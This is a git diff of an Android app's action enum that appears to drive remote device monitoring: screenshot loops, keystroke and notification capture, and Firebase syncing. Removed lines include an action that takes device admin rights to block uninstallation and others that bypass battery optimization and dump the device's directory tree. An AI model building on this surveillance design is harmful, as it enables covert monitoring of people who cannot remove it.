@@ -1,26 +1,19 @@
 package com.vikasyadavnsit.cdc.enums;
 
-import static com.vikasyadavnsit.cdc.utils.ActionUtils.checkAndRequestBatteryOptimization;
-import static com.vikasyadavnsit.cdc.utils.ActionUtils.checkOrGetNotificationListenerPermission;
-import static com.vikasyadavnsit.cdc.utils.ActionUtils.enableAppUsageStats;
-
 import android.app.Activity;
+import android.content.Context;
+import android.util.Log;
 
 import com.vikasyadavnsit.cdc.data.User;
-import com.vikasyadavnsit.cdc.database.AppDatabase;
 import com.vikasyadavnsit.cdc.permissions.PermissionManager;
-import com.vikasyadavnsit.cdc.services.AppUsageStats;
 import com.vikasyadavnsit.cdc.services.CDCSensorService;
 import com.vikasyadavnsit.cdc.services.ScreenshotService;
-import com.vikasyadavnsit.cdc.utils.AccessibilityUtils;
 import com.vikasyadavnsit.cdc.utils.ActionUtils;
 import com.vikasyadavnsit.cdc.utils.CallUtils;
-import com.vikasyadavnsit.cdc.utils.FileExplorer;
 import com.vikasyadavnsit.cdc.utils.FileUtils;
 import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
-import com.vikasyadavnsit.cdc.utils.LoggerUtils;
+import com.vikasyadavnsit.cdc.utils.AccessibilityUtils;
 import com.vikasyadavnsit.cdc.utils.MessageUtils;
-import com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils;
 
 import java.util.function.BiConsumer;
 
@@ -99,7 +92,7 @@ public enum ClickActions {
                         } catch (InterruptedException e) {
                             throw new RuntimeException(e);
                         }
-                        LoggerUtils.d("ClickActions", "Took the " + i + " screenshot");
+                        Log.d("ClickActions", "Took the " + i + " screenshot");
                     }
                 } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                     ScreenshotService.setStopScreenshotService(true);
@@ -165,65 +158,21 @@ public enum ClickActions {
     CAPTURE_KEY_STROKES(
             13,
             (context, triggerSettingsData) -> {
+
             },
             "Capture key strokes (It will capture all the key strokes)",
             "Capture key strokes"
     ), CAPTURE_NOTIFICATIONS(
             14,
             (context, triggerSettingsData) -> {
-               // checkOrGetNotificationListenerPermission(context);
+
             },
             "Capture Device Notifications (It will capture all the device notifications)",
             "Capture Device Notification"
-    ), TAKE_DEVICE_ADMIN_PERMISSIONS(
-            15,
-            (context, triggerSettingsData) -> {
-                ActionUtils.takeDeviceAdminPermission(context);
-            },
-            "Take Device Admin Permission (It will take the device admin permissions, so that we can prevent app uninstall)",
-            "Take Device Admin Permission"
-    ), RESET_EVERYTHING(
-            16,
-            (context, triggerSettingsData) -> {
-                AppDatabase.deleteAllRecords();
-                //SharedPreferenceUtils.resetFirstLauncher(context);
-                SharedPreferenceUtils.resetAllData(context);
-                FirebaseUtils.deleteUserAndDeviceData();
-                ClickActions.RESET_ALL_PERMISSION.biConsumer.accept(context, triggerSettingsData);
-            },
-            "Reset Everything (It will delete all the data on firebase which includes App data, Device data, User data )",
-            "Reset Everything"
-    ), MONITOR_APP_USAGE_STATISTICS(
-            17,
-            (context, triggerSettingsData) -> {
-            },
-            "App Usage Statistics (It will monitor all the app usage statistics in realtime)",
-            "Monitor APP Usage Statistics"
-    ), GET_APP_USAGE_STATISTICS_REPORT(
-            18,
-            (context, triggerSettingsData) -> {
-                enableAppUsageStats(context);
-                AppUsageStats.getDailyUsageStats((Activity) context);
-            },
-            "App Usage Statistics (It will capture all the app usage statistics when invoked)",
-            "Get APP Usage Statistics Report"
-    ), PREVENT_BATTERY_OPTIMIZATIONS(
-            19,
-            (context, triggerSettingsData) -> {
-                checkAndRequestBatteryOptimization(context);
-            },
-            "It will disable the battery optimization so that application can run in background",
-            "Prevent Battery Optimization"
-    ), GET_DIRECTORY_STRUCTURE(
-            20,
-            (context, triggerSettingsData) -> {
-                FileExplorer.getDirectoryStructure();
-            },
-            "It will get the directory structure from the device root",
-            "Get Directory Structure"
     );
+
     int order;
-    BiConsumer<Activity, User.AppTriggerSettingsData> biConsumer;
+    BiConsumer<Context, User.AppTriggerSettingsData> biConsumer;
     String description;
     String actionLabel;
 }
